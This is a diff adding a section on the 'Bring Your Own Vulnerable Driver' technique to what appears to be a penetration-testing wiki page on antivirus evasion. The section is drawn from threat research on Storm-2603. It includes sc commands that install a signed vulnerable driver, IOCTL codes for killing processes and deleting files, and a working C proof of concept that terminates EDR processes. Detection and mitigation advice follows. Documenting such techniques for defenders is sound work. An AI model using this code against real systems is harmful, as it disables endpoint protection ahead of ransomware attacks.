@@ -639,4 +639,45 @@ https://github.com/praetorian-code/vulcan
 
 - [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)
 
+## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space
+
+Storm-2603 leveraged a tiny console utility known as **Antivirus Terminator** to disable endpoint protections before dropping ransomware. The tool brings its **own vulnerable but *signed* driver** and abuses it to issue privileged kernel operations that even Protected-Process-Light (PPL) AV services cannot block.
+
+Key take-aways
+1. **Signed driver**: The file delivered to disk is `ServiceMouse.sys`, but the binary is the legitimately signed driver `AToolsKrnl64.sys` from Antiy Labs’ “System In-Depth Analysis Toolkit”. Because the driver bears a valid Microsoft signature it loads even when Driver-Signature-Enforcement (DSE) is enabled.
+2. **Service installation**:
+   ```powershell
+   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
+   sc start  ServiceMouse
+   ```
+   The first line registers the driver as a **kernel service** and the second one starts it so that `\\.\ServiceMouse` becomes accessible from user land.
+3. **IOCTLs exposed by the driver**
+   | IOCTL code | Capability                              |
+   |-----------:|-----------------------------------------|
+   | `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
+   | `0x990000D0` | Delete an arbitrary file on disk |
+   | `0x990001D0` | Unload the driver and remove the service |
+
+   Minimal C proof-of-concept:
+   ```c
+   #include <windows.h>
+   
+   int main(int argc, char **argv){
+       DWORD pid = strtoul(argv[1], NULL, 10);
+       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
+       CloseHandle(hDrv);
+       return 0;
+   }
+   ```
+4. **Why it works**:  BYOVD skips user-mode protections entirely; code that executes in the kernel can open *protected* processes, terminate them, or tamper with kernel objects irrespective of PPL/PP, ELAM or other hardening features.
+
+Detection / Mitigation
+•  Enable Microsoft’s vulnerable-driver block list (`HVCI`, `Smart App Control`) so Windows refuses to load `AToolsKrnl64.sys`.
+•  Monitor creations of new *kernel* services and alert when a driver is loaded from a world-writable directory or not present on the allow-list.
+•  Watch for user-mode handles to custom device objects followed by suspicious `DeviceIoControl` calls.
+
+## References
+
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 {{#include ../banners/hacktricks-training.md}}
